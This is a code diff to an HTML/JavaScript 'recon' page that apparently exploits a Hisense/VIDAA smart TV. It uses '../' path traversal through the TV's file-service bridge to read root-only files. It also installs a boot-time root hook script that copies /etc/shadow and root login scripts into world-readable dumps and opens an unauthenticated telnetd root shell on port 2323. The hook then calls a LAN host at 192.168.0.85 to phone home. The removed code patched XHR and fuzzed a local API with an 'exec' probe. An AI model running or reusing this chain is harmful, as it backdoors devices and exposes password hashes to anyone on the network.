@@ -11,40 +11,35 @@
   #btns { position: fixed; top: 6px; right: 6px; z-index: 2; }
   #btns div { display: inline-block; background: #123; color: #6cf; border: 2px solid #6cf;
               padding: 10px 16px; margin-left: 8px; font: bold 18px Menlo, monospace; }
+  #hook { background: #301; color: #f88; border-color: #f88; }
 </style>
 </head>
 <body>
 <div id="btns">
   <div onclick="location.reload()">RERUN</div>
   <div id="inst">INSTALL AS APP</div>
+  <div id="hook">INSTALL ROOT HOOK</div>
 </div>
 <div id="out"></div>
 <script>
 (function () {
   "use strict";
 
-  // Recon v4.
-  // v3 established: fileRead/fileWrite chroot to /APPS, "../" escapes to /,
-  // rootfs is dm-verity-protected squashfs (locked/green AVB), UART getty on
-  // ttyS0, root shell = /usr/local/scripts/rootlogin.sh, UID-0 cli account,
-  // rw+exec mounts: /APPS /data /var/local /var/tvservice /OAD.
-  // v3 also revealed the bridge is a JS shim XHRing http://localhost:9009 and
-  // that binary reads crash that backend.
-  // v4: (1) capture the shim's wire format by patching XHR.prototype,
-  // (2) identify the file service via /proc/self, (3) dump the boot scripts
-  // that map root services to rw mounts, (4) fuzz the raw 9009 API.
-  // The report is POSTed incrementally after each section.
+  // Recon v8.
+  // v7 established: the UART root-shell gate (key_check.sh) in full, the OEM
+  // white-name map (data-only), and the root primitive — rc.local executes
+  // /var/local/otaTest.sh (root) if present, and /var/local is bridge-writable.
+  // v8: reads the openssh/telnetd starter conditions, the superwatch config
+  // pointer, the JS-service package manifests, and — behind an explicit
+  // button — writes the root hook script.
 
   var el = document.getElementById("out");
   var report = {
     started: new Date().toISOString(),
     ua: navigator.userAgent,
-    href: location.href,
-    wire: [],
-    identity: {},
+    marker: {},
     files: {},
-    api: {},
-    binaries: {}
+    hook: {}
   };
 
   function trunc(s, n) {
@@ -82,47 +77,6 @@
     } catch (e) { /* screen still shows results */ }
   }
 
-  function enumBridge() {
-    var found = [];
-    var names = Object.getOwnPropertyNames(window);
-    for (var i = 0; i < names.length; i++) {
-      var n = names[i];
-      if (!/^(Hisense|Hi[A-Z]|vidaa|Vidaa|WebAPI|webapi)/i.test(n)) continue;
-      var v;
-      try { v = window[n]; } catch (e) { continue; }
-      found.push(n + ":" + typeof v);
-    }
-    return found;
-  }
-
-  // -- wire capture: the shim calls XHR through the prototype at call time,
-  //    so patching the prototype records its exact requests.
-  var wire = report.wire;
-  try {
-    var proto = window.XMLHttpRequest.prototype;
-    var origOpen = proto.open, origSend = proto.send,
-        origHdr = proto.setRequestHeader;
-    proto.open = function (m, u) {
-      this.__rec = { method: m, url: String(u), headers: {}, body: null, via: "patched" };
-      wire.push(this.__rec);
-      return origOpen.apply(this, arguments);
-    };
-    proto.setRequestHeader = function (k, v) {
-      if (this.__rec) this.__rec.headers[k] = String(v);
-      return origHdr.apply(this, arguments);
-    };
-    proto.send = function (b) {
-      if (this.__rec) {
-        this.__rec.body = b == null ? null : trunc(
-          typeof b === "string" ? b : "(binary)", 2000);
-      }
-      return origSend.apply(this, arguments);
-    };
-  } catch (e) {
-    wire.push({ patchError: String(e) });
-  }
-
-  // Uses the (possibly patched) XHR via the shim — hiCall stays identical.
   function hiCall(action, params) {
     try {
       if (typeof HiUtils_createRequest !== "function") return { error: "no bridge" };
@@ -136,150 +90,114 @@
     }
   }
 
-  function hiFn(name) {
-    try {
-      var f = window[name];
-      if (typeof f !== "function") return { error: "missing" };
-      var r = f();
-      if (r && typeof r === "object") return normMsg(r);
-      return trunc(r, 2000);
-    } catch (e) {
-      return "threw: " + String(e);
-    }
-  }
-
   function rd(path) {
     var r = hiCall("fileRead", { path: path, mode: 6 });
     report.files[path] = r;
     return r;
   }
 
-  // Raw direct XHR to the hiutils backend (bypasses the shim's restrictions).
-  function rawApi(method, url, body, timeoutMs) {
-    return new Promise(function (resolve) {
-      try {
-        var x = new XMLHttpRequest();
-        // construction goes through the patched prototype, so tag the record
-        if (x.__rec) x.__rec.via = "fuzzer";
-        x.open(method, url, true);
-        x.timeout = timeoutMs || 4000;
-        x.onload = function () {
-          resolve({ status: x.status,
-                    head: trunc(x.responseText || "", 2000) });
-        };
-        x.onerror = function () { resolve({ error: "blocked or failed" }); };
-        x.ontimeout = function () { resolve({ error: "timeout" }); };
-        if (body != null) x.setRequestHeader("Content-Type", "application/json");
-        x.send(body == null ? null : body);
-      } catch (e) {
-        resolve({ exception: String(e) });
-      }
-    });
+  // The root hook. Runs as root at next boot (rc.local). Harvests root-only
+  // intel into world-readable dumps, starts telnetd on 2323, phones home.
+  // Remove via: rm /var/local/otaTest.sh (the hook also self-documents).
+  var HOOK = [
+    "#!/bin/sh",
+    "# alvidaa root hook — installed " + report.started,
+    "# remove: delete /var/local/otaTest.sh (via recon.html REMOVE ROOT HOOK)",
+    "exec > /var/local/otaTest.log 2>&1",
+    "date; id; uname -a",
+    "ps",
+    "netstat -tln 2>/dev/null || busybox netstat -tln 2>/dev/null",
+    "find /usr/local /opt /application -maxdepth 3 -iname '*kilby*' 2>/dev/null",
+    "ls -la /usr/local/bin/openssh/ 2>/dev/null",
+    "mkdir -p /var/local/rootdumps",
+    "cp /etc/shadow /var/local/rootdumps/ 2>/dev/null",
+    "cp /usr/local/scripts/rootlogin.sh /var/local/rootdumps/ 2>/dev/null",
+    "cp /etc/cli_login.sh /var/local/rootdumps/ 2>/dev/null",
+    "cp /usr/local/scripts/key_check.sh /var/local/rootdumps/ 2>/dev/null",
+    "cp /usr/local/bin/check_usb_key /var/local/rootdumps/ 2>/dev/null",
+    "chmod 755 /var/local/rootdumps",
+    "chmod 644 /var/local/rootdumps/* 2>/dev/null",
+    "busybox telnetd -p 2323 -l /bin/sh 2>/dev/null && echo 'telnetd on 2323'",
+    "wget -q -O /dev/null 'http://192.168.0.85:8770/api/state' 2>/dev/null",
+    "echo 'hook done'"
+  ].join("\n") + "\n";
+
+  function installHook() {
+    var status = document.getElementById("hook");
+    // refuse if one already exists (never blindly overwrite)
+    var cur = hiCall("fileRead", { path: "../var/local/otaTest.sh", mode: 6 });
+    if (isOk(cur.ret) && cur.msg.indexOf("alvidaa root hook") === -1) {
+      status.textContent = "otaTest.sh EXISTS (foreign) — not overwriting";
+      status.style.color = "#f88";
+      report.hook = { status: "foreign-file-present", head: trunc(cur.msg, 400) };
+      save("hook");
+      return;
+    }
+    var w = hiCall("fileWrite", { path: "../var/local/otaTest.sh", mode: 6,
+                                  writedata: HOOK });
+    report.hook = { status: isOk(w.ret) ? "written" : "failed", result: w };
+    if (isOk(w.ret)) {
+      var rb = hiCall("fileRead", { path: "../var/local/otaTest.sh", mode: 6 });
+      report.hook.readback_ok = isOk(rb.ret);
+      status.textContent = "ROOT HOOK INSTALLED — reboot the TV";
+      status.style.color = "#8f8";
+    } else {
+      status.textContent = "hook write failed: " + trunc(w.msg, 120);
+    }
+    save("hook");
   }
 
-  var IDENTITY_CALLS = [
-    "Hisense_GetFirmWareVersion", "Hisense_GetOSVersion", "Hisense_GetChipSetName",
-    "Hisense_GetModelName", "Hisense_GetSerialType", "Hisense_GetChromiumVersion"
+  var DUMP_TARGETS = [
+    "usr/local/bin/openssh/startsshd.sh",
+    "usr/local/bin/openssh/starttelnetd.sh",
+    "usr/local/scripts/start-superwatch.sh",
+    "usr/local/scripts/OEMfacstart.sh",
+    "opt/hisenseUI/startgui.sh",
+    "APPS/pkgs/tv.vidaa.jsservice.system/CHA/package.json",
+    "APPS/pkgs/tv.vidaa.jsservice.basic/CHA/package.json",
+    "var/local/otaTest.log",
+    "proc/uptime"
   ];
 
-  // ".." = real root (proven). Order: identity of the file service first —
-  // if hiutils runs as root, the whole picture changes.
-  var DUMP_TARGETS = [
-    "proc/self/cmdline",
-    "proc/self/status",
-    "sys/fs/selinux/enforce",
-    "etc/init.d/rcS.utopia.linux",
-    "etc/init.d/rcS.utopia.linuxB",
-    "etc/rc.d/rc.local",
-    "usr/local/scripts/login.sh",
-    "usr/local/scripts/rootlogin.sh",
-    "etc/cli_login.sh",
-    "etc/inittab"
-  ];
+  var PKG_DIR = "../APPS/pkgs/tv.vidaa.jsservice.basic/CHA/";
 
   function run() {
-    line("== alvidaa recon v4 ==");
-    line(report.ua, "warn");
+    line("== alvidaa recon v8 ==");
+    line(report.ua);
     save("start");
 
-    // 1. bridge surface + identity
-    var b = enumBridge();
-    line("bridge: " + b.length + " functions", b.length ? "ok" : "err");
-    for (var i = 0; i < IDENTITY_CALLS.length; i++) {
-      var v = hiFn(IDENTITY_CALLS[i]);
-      report.identity[IDENTITY_CALLS[i]] = v;
-    }
-    line("fw=" + report.identity.Hisense_GetFirmWareVersion +
-         " os=" + report.identity.Hisense_GetOSVersion +
-         " chip=" + report.identity.Hisense_GetChipSetName, "ok");
-    save("identity");
-
-    // 2. who runs the file service? + selinux + boot scripts
-    line("-- service identity + boot map --", "hdr");
+    // 1. dump targets
+    line("-- root service conditions --", "hdr");
     for (var j = 0; j < DUMP_TARGETS.length; j++) {
       var t = DUMP_TARGETS[j];
       var r = rd("../" + t);
       if (isOk(r.ret)) {
-        line("[ok] /" + t + " (" + r.msg.length + " b): " + trunc(r.msg, 300), "ok");
+        line("[ok] /" + t + " (" + r.msg.length + " b): " + trunc(r.msg, 240), "ok");
       } else {
-        line("[--] /" + t + ": " + trunc(r.msg, 100));
+        line("[--] /" + t + ": " + trunc(r.msg, 90));
       }
     }
+    // directory-existence oracle for the openssh dir
+    var dirProbe = hiCall("fileRead", { path: "../usr/local/bin/openssh/", mode: 6 });
+    report.files["usr/local/bin/openssh/"] = dirProbe;
+    line("[dir] /usr/local/bin/openssh/ -> " + trunc(dirProbe.msg, 60) +
+      (String(dirProbe.msg).indexOf("EISDIR") !== -1 ? " (EXISTS)" : ""), "warn");
     save("dumps");
 
-    // 3. raw API fuzz on localhost:9009 — shape learned from wire[]
-    line("-- raw api --", "hdr");
-    var chain = Promise.resolve();
-    chain = chain.then(function () {
-      var probes = [
-        { m: "GET", u: "http://localhost:9009/service/hiutils", b: null },
-        { m: "GET", u: "http://localhost:9009/", b: null },
-        { m: "POST", u: "http://localhost:9009/service/hiutils",
-          b: JSON.stringify({ type: "fileRead", path: "../etc/inittab", mode: 6 }) },
-        { m: "POST", u: "http://localhost:9009/service/hiutils",
-          b: JSON.stringify({ action: "fileRead", params: { path: "../etc/inittab", mode: 6 } }) },
-        { m: "POST", u: "http://localhost:9009/service/hiutils",
-          b: JSON.stringify({ action: "listdir", params: { path: "../etc/init.d/" } }) },
-        { m: "POST", u: "http://localhost:9009/service/hiutils",
-          b: JSON.stringify({ action: "getfilelist", params: { path: "../etc/init.d/" } }) },
-        { m: "POST", u: "http://localhost:9009/service/hiutils",
-          b: JSON.stringify({ action: "exec", params: { cmd: "id" } }) }
-      ];
-      var results = {};
-      var inner = Promise.resolve();
-      probes.forEach(function (p, idx) {
-        inner = inner.then(function () {
-          return rawApi(p.m, p.u, p.b).then(function (res) {
-            results["probe" + idx + "_" + p.m + "_" + p.u.replace(/.*9009/, "") +
-                    "_" + trunc(p.b, 60)] = res;
-            line("[" + p.m + " " + trunc(p.u.replace("http://localhost:9009", ""), 30) +
-                 " " + trunc(p.b, 40) + "] -> " + JSON.stringify(trunc(res, 160)),
-              res.status === 200 ? "ok" : "");
-          });
-        });
-      });
-      return inner.then(function () {
-        report.api = { probes: results, wire: wire };
-        save("api");
-      });
-    });
+    // 2. marker
+    var mk = PKG_DIR + ".recon_marker";
+    var m0 = hiCall("fileRead", { path: mk, mode: 6 });
+    report.marker = {
+      path: "/APPS/pkgs/tv.vidaa.jsservice.basic/CHA/.recon_marker",
+      existed_before: isOk(m0.ret),
+      content: isOk(m0.ret) ? trunc(m0.msg, 200) : null
+    };
+    line("[marker] " + (isOk(m0.ret) ? "present" : "missing"), "warn");
+    save("marker");
 
-    // 4. LAST and alone: one binary read retry (crashed the backend in v3)
-    chain.then(function () {
-      line("-- binary probe (backend may die here) --", "hdr");
-      var br = rd("../bin/sh");
-      report.binaries["bin/sh"] = { exists: isOk(br.ret), size: isOk(br.ret) ? br.msg.length : 0,
-                                    head: trunc(br.msg, 80) };
-      line(isOk(br.ret) ? "[exists] /bin/sh (" + br.msg.length + " b)" :
-        "[--] /bin/sh: " + trunc(br.msg, 100), isOk(br.ret) ? "ok" : "");
-      var alive = hiCall("fileRead", { path: "../etc/inittab", mode: 6 });
-      report.binaries.backend_alive_after = isOk(alive.ret);
-      line("backend alive after binary read: " + isOk(alive.ret),
-        isOk(alive.ret) ? "ok" : "err");
-      report.finished = new Date().toISOString();
-      save("final");
-      line("== done ==", "hdr");
-    });
+    report.finished = new Date().toISOString();
+    save("final");
+    line("== done ==", "hdr");
   }
 
   document.getElementById("inst").addEventListener("click", function () {
@@ -306,6 +224,7 @@
     }
   });
 
+  document.getElementById("hook").addEventListener("click", installHook);
   run();
 })();
 </script>
